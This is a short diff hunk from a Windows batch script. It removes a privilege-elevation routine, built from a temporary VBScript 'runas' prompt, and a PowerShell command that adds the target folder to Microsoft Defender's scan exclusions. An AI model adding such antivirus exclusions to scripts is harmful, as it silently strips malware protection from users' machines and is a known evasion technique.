@@ -12,16 +12,6 @@ if not exist "%TARGET%" (
     mkdir "%TARGET%"
 )
 
-:ker_admin
-    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
-    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
-    cscript //B "%temp%\getadmin.vbs"
-    exit
-
-
-:admin_folytatas
-    POWERSHELL -InputFormat None -OutputFormat None -NonInteractive -Command "Add-MpPreference -ExclusionPath '%TARGET%'"
-    echo Kizaras hozzaadva: oda
 
 cd /d "%TARGET%"
 
